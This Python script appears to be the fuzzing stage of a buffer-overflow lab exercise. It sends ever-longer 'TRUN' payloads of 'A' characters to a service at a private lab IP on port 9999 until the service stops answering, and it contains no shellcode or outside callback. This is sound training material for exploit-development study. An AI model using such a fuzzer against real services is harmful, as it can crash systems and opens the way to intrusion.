#!/usr/bin/python
import sys
import socket
from time import sleep

def fuzzing():
    buffer = "A" * 100
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # Add timeout
            s.connect(('192.168.89.145', 9999))
            
            print(f"Sending buffer with {len(buffer)} bytes...")  # Status update
            
            payload = f"TRUN /.:/{buffer}"
            s.send(payload.encode())
            
            s.close()
            sleep(1)
            buffer += "A" * 100
            
        except :
            print(f"Fuzzing crashed at {len(buffer)} bytes")
            sys.exit()
        

if __name__ == "__main__":
    fuzzing()
